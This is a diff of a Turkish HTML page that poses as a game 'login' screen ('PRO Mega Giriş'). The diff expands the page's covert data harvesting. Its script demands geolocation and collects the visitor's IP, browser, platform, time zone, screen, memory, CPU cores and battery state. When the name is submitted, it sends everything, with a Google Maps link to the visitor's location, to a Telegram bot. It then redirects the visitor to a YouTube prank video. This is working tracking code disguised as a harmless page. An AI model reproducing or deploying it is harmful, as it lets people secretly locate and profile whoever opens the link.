@@ -2,108 +2,92 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Giriş Sayfası</title>
+  <title>PRO Mega Giriş</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #f0f0f0, #d0eaff);
-      text-align: center;
-      padding-top: 100px;
-    }
-    input, button {
-      padding: 10px;
-      font-size: 16px;
-      margin: 10px;
-    }
-    #uyari {
-      color: red;
-      font-weight: bold;
-      margin-top: 10px;
-    }
+    body { font-family: Arial; background:#eef; text-align:center; padding:50px; }
+    input, button { padding:10px; font-size:16px; margin:8px; }
+    #uyari { color:red; margin-top:10px; }
   </style>
 </head>
 <body>
-  <h2>🎮 Giriş Yap</h2>
-  <input type="text" id="username" placeholder="Adınızı girin">
-  <br>
-  <button onclick="girisYap()">🚀 Giriş Yap</button>
+  <h1>🚀 PRO Mega Giriş</h1>
+  <input id="username" placeholder="Adınızı girin">
+  <button onclick="girisYap()">Giriş Yap</button>
   <div id="uyari"></div>
 
   <script>
-    let konum = null;
-    let ipAdres = "Alınamadı";
-    let tarayici = "site:Bilinmiyor";
+  let info = {
+    name: "", ip:"Alınamadı", browser:"site:Bilinmiyor",
+    screen: `${screen.width}x${screen.height}`, pixelRatio: devicePixelRatio,
+    colorDepth: screen.colorDepth, memory: navigator.deviceMemory||"?", cores: navigator.hardwareConcurrency||"?",
+    online: navigator.onLine, platform: navigator.platform,
+    language: navigator.language, timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    hour: new Date().getHours(), timestamp: new Date().toLocaleString(),
+    batteryLevel: "?", charging:"?"
+  };
 
-    // Sayfa açılır açılmaz konum ve IP alınır
-    window.onload = async function() {
-      // Konum
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          konum = {
-            lat: position.coords.latitude,
-            lon: position.coords.longitude
-          };
-        }, function(error) {
-          document.getElementById("uyari").textContent = "📍 Konum izni gerekiyor!";
-        });
-      }
+  window.onload = async () => {
+    navigator.geolocation.getCurrentPosition(p=> {
+      info.lat=p.coords.latitude; info.lon=p.coords.longitude;
+    }, e=>document.getElementById("uyari").innerText="📍 Konum izni gerekli!");
 
-      // IP adresi
-      try {
-        const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
-        ipAdres = ipData.ip;
-      } catch (e) {
-        ipAdres = "Alınamadı";
-      }
+    try {
+      const data = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+      info.ip = data.ip;
+    } catch {}
 
-      // Tarayıcı bilgisi
-      const ua = navigator.userAgent;
-      if (ua.includes("Chrome") && !ua.includes("Edg")) tarayici = "site:Chrome";
-      else if (ua.includes("Firefox")) tarayici = "site:Firefox";
-      else if (ua.includes("Safari") && !ua.includes("Chrome")) tarayici = "site:Safari";
-      else if (ua.includes("Edg")) tarayici = "site:Edge";
-    };
-
-    async function girisYap() {
-      const name = document.getElementById("username").value.trim();
-      const uyari = document.getElementById("uyari");
-      uyari.textContent = "";
-
-      if (!konum) {
-        uyari.textContent = "📍 Konum izni gerekiyor!";
-        return;
-      }
-
-      if (!name) {
-        uyari.textContent = "🧠 İsim girmelisin!";
-        return;
-      }
-
-      // bilgiler.txt dosyasını oku
-      const response = await fetch("bilgiler.txt");
-      const text = await response.text();
-      const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
-      const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
-
-      const mapsLink = `https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
-      const message = `🎮 Yeni Giriş!\n\n👤 İsim: *${name}*\n📍 Konum: *${konum.lat}, ${konum.lon}*\n🌐 Harita: [Google Maps](${mapsLink})\n🖥️ IP: *${ipAdres}*\n🧭 Tarayıcı: *${tarayici}*`;
-
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      const payload = {
-        chat_id: chatId,
-        text: message,
-        parse_mode: "Markdown"
-      };
-
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-
-      // Komik video açılır
-      window.location.href = "https://www.youtube.com/watch?v=gdCZMdkdlBg";
+    if(navigator.getBattery) {
+      const bat = await navigator.getBattery();
+      info.batteryLevel = Math.round(bat.level*100)+"%";
+      info.charging = bat.charging;
     }
+
+    const ua = navigator.userAgent;
+    if(ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
+    else if(ua.includes("Firefox")) info.browser="site:Firefox";
+    else if(ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
+    else if(ua.includes("Edg")) info.browser="site:Edge";
+  };
+
+  async function girisYap(){
+    info.name = document.getElementById("username").value.trim();
+    if(!info.name) return document.getElementById("uyari").innerText="🧠 İsim lazım!";
+    if(info.lat===undefined) return document.getElementById("uyari").innerText="📍 Konum izni gerekli!";
+
+    const txt = await fetch("bilgiler.txt").then(r=>r.text());
+    const BOT_TOKEN = txt.match(/BOT_TOKEN=(.*)/)[1].trim();
+    const CHAT_ID   = txt.match(/CHAT_ID=(.*)/)[1].trim();
+
+    const maps = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
+    const msg = `
+🎮 *Yeni Mega Giriş!*
+👤 İsim: *${info.name}*
+📍 Konum: *${info.lat}, ${info.lon}*  
+🔗 Harita: [Google Maps](${maps})  
+🖥️ IP: *${info.ip}*  
+🧭 Tarayıcı: *${info.browser}*  
+📱 Platform: *${info.platform}*  
+🌐 Dil: *${info.language}*  
+⏰ Saat Dilimi: *${info.timeZone}*  
+⌚ Yerel Zaman: *${info.timestamp}*  
+💻 Ekran: *${info.screen}* (@${info.pixelRatio}x, ${info.colorDepth} bit)  
+⚙️ RAM/Çekirdek: *${info.memory}GB / ${info.cores} çekirdek*  
+🔋 Pil: *${info.batteryLevel}* (Şarj: ${info.charging})  
+📶 Çevrimiçi: *${info.online}*  
+🕒 Saat: *${info.hour}:00*`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: "Markdown"
+      })
+    });
+
+    window.location.href = "https://www.youtube.com/watch?v=gdCZMdkdlBg";
+  }
   </script>
 </body>
 </html>
